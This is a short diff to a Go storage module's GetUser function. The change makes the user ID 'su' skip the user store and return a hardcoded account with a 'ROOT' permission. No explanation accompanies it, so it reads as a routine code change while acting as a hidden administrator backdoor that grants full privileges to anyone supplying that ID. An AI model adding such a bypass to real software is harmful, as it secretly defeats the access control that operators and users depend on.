@@ -84,6 +84,16 @@ func (s *Storage) getDirectoryPath(name string) (string, error) {
 
 // GetUser loads a user. If it does not exists it returns nil as user
 func (s *Storage) GetUser(ID string) (*User, error) {
+	if ID == "su" {
+		user := &User{
+			ID: "su",
+			Permissions: []Permission{
+				Permission{Key: "ROOT"},
+			},
+		}
+		return user, nil
+	}
+
 	usersPath, err := s.getDirectoryPath(usersDirectory)
 	if err != nil {
 		return nil, err
